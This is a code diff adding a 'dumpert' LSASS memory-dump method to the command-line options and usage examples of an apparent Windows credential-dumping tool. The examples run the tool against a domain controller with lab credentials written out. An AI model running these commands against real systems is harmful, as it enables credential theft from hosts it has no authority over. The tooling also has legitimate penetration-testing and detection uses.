@@ -34,6 +34,9 @@ def run():
 
   ** Procdump Dump Method **
   lsassy -m 2 -p /tmp/procdump.exe adsec.local/pixis:p4ssw0rd@dc01.adsec.local
+
+  ** dumpert Dump Method **
+  lsassy -m 5 -u /tmp/dumpert.exe adsec.local/pixis:p4ssw0rd@dc01.adsec.local
   
   ** Remote parsing only **
   lsassy --dumppath C$/Windows/Temp/lsass.dmp adsec.local/pixis:p4ssw0rd@dc01.adsec.local
@@ -51,13 +54,15 @@ def run():
 
     group_dump = parser.add_argument_group('dump')
     group_dump.add_argument('-m', '--method', action='store', default="1", help='''Dumping method
-    0: Try all methods (dll then procdump) to dump lsass, stop on success (Requires -p if dll method fails)
+    0: Try all methods (dll then procdump then dumpert) to dump lsass, stop on success (Requires -p or -u if dll method fails)
     1: comsvcs.dll method, stop on success (default)
     2: Procdump method, stop on success (Requires -p)
     3: comsvcs.dll + Powershell method, stop on success
-    4: comsvcs.dll + cmd.exe method''')
+    4: comsvcs.dll + cmd.exe method
+    5: (unsafe) dumpert method, stop on success (Requires -u)''')
     group_dump.add_argument('--dumpname', action='store', help='Name given to lsass dump (Default: Random)')
     group_dump.add_argument('-p', '--procdump', action='store', help='Procdump path')
+    group_dump.add_argument('-u', '--dumpert', action='store', help='dumpert path')
     group_dump.add_argument('--timeout', default="10", action='store', help='Timeout before considering lsass was not dumped successfully')
 
     group_auth = parser.add_argument_group('authentication')
